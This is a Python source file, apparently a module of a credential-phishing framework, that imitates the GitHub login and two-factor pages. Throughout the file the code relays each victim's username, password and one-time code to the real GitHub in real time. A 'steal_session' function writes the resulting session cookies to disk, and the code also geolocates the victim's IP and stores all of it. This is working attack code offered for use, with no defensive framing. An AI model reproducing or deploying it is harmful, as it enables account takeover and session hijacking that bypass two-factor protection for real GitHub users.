from __future__ import print_function
from flask import redirect, request, jsonify, Markup
from os import system
from core import functions
from core.base_module import *
import uuid
import mechanicalsoup
import bs4
import re, sys, time, random
import time
import json
import traceback

class GithubModule(BaseModule):
    def __init__(self, enable_2fa=False):
        super().__init__(self)

        self.set_name('github')
        self.add_route('main', '/')
        self.add_route('validate', '/validate')
        self.add_route('twofactor', '/twofactor')
        self.add_route('redirect', '/redirect')
        self.enable_two_factor(enable_2fa)
        self.browser = None

    def main(self):
        """
        Display login portal for GitHub. Submit user/pass
        to /validate to verify user typed in correct creds.
        """
        next_url = '/validate'
        template = self.env.get_template('login.html')
        error = request.values.get('error')

        return template.render(
            next_url=next_url,
            hostname=request.host,
            error=error,
        )

    def validate(self):
        """
        Handle credentials submitted and proceed to the 2FA page
        if the credentials are valid.
        Redirects to login page if the creds are bad.
        """
        self.user = request.values.get('login')
        possible_passwd = request.values.get('password')

        try:
            valid_creds = self.submit_creds(self.user, possible_passwd)
            if valid_creds:
                self.password = request.values.get('password')
                functions.cache_creds(self.name, self.user, self.password)
                return redirect('/twofactor', code=302)
            else:
                return redirect('/?error=1', code=302)
        except Exception as err:
            print(traceback.format_exc())
            return redirect('/?error=2', code=500)

    def submit_creds(self, user, passwd):
        """
        Submit credentials to GitHub and verify they're valid
        Returns: Boolean
        """
        self.browser = mechanicalsoup.StatefulBrowser(
            soup_config={'features': 'lxml'},
            raise_on_404=True,
        )
        self.browser.open('https://github.com/login')
        self.browser.select_form('#login form')
        self.browser["login"] = user
        self.browser["password"] = passwd
        self.browser.submit_selected()
        if self.browser.get_url() == 'https://github.com/sessions/two-factor':
            # Valid creds result in a redirect to /sessions/two-factor
            return True
        else:
            return False

    def submit_otp(self, otp):
        """
        Submit the OTP and verify it was valid. If not, display an error
        and reprompt the user for the correct OTP.
        Returns: Boolean
        """
        self.browser.select_form('form')
        self.browser["otp"] = otp
        self.browser.submit_selected()
        page = self.browser.get_url()
        if page == 'https://github.com/sessions/two-factor':
            # Bad OTPs just reload the OTP page
            return False
        else:
            return True

    def twofactor(self):
        """
        Present OTP page since valid credentials have been provided 
        at this point. Now prompt the user for their two-factor code.
        """
        next_url = '/redirect'

        template = self.env.get_template('twofactor.html')
        error = request.values.get('error')

        return template.render(
            hostname=request.host,
            next_url=next_url,
            error=error,
        )

    def steal_session(self, file):
        """ Write current active GutHub session to `file` """
        with open(file, "a+") as store:
            for cookie, value in self.browser.session.cookies.iteritems():
                data = "{}={};\n".format(cookie, value)
                store.write(data)

    def redirect(self):
        """ 
        Final redirect of a valid session has been created.
        """

        self.two_factor_token = request.values.get('otp')
        self.two_factor_type = 'otp'

        valid_otp = self.submit_otp(self.two_factor_token)
        if not valid_otp:
            return redirect('/twofactor?error=1', code=302)
        
        file = "./{}.sess".format(self.user)
        self.steal_session(file)

        city, region, zip_code = '','',''
        try:
            geoip_url = 'https://freegeoip.net/json/{}'.format(
                request.remote_addr
            )
            geo_browser = mechanicalsoup.StatefulBrowser()
            geo_response = geo_browser.open(geoip_url)
            geo = json.loads(geo_response.text)
            city = geo['city']
            region = geo['region_name']
            zip_code = geo['zip_code']
        except Exception as ex:
            pass

        functions.store_creds(
            self.name,
            self.user,
            self.password,
            self.two_factor_token,
            self.two_factor_type,
            request.remote_addr,
            city,
            region,
            zip_code
        )
        return redirect(self.final_url, code=302)


def load(enable_2fa=False):
    return GithubModule(enable_2fa)
